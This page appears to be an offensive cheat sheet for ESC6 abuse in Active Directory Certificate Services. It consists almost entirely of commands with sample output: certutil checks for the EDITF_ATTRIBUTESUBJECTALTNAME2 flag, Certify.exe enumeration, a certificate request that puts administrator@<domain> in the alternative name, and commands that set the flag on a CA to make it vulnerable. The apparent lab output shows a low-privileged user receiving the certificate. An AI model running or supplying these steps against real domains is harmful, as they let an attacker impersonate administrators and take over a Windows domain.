title: ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
html:
Conditions: CA-wide flag EDITF_ATTRIBUTESUBJECTALTNAME2 is set, allowing SAN specification in ANY certificate request regardless of template settings.

Warning

Post-KB5014754 (May 2022), exploitation commonly also requires ESC9 or ESC10 conditions to be effective.

Check Flag

certutil -config "<ca-host>\<ca-name>" -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags
certutil -config "<domain>\<ca>" -getreg CA\PolicyModules\...\EditFlags

HKEY_LOCAL_MACHINE\...\EditFlags REG_DWORD = 0x144120 (1327392)

EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)  <-- VULNERABLE!

Enumerate with Certify

Certify.exe find /vulnerable
Certify.exe find /vulnerable

[!] Certificate Authority has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set!

    Enterprise CA Name  : <ca>
    UserSpecifiedSAN    : Enabled (ESC6)

Exploit

Certify.exe request /ca:<ca-host>\<ca-name> /template:User /altname:<target-user>@<domain>
Certify.exe request /ca:<domain>\<ca> /template:User /altname:administrator@<domain>

[*] Current user context : ESSOS\missandei
[*] CA Response          : The certificate has been issued.
[*] Request ID           : 13

Enable Flag (if CA admin rights)

certutil -config "<ca-host>\<ca-name>" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
Restart-Service CertSvc
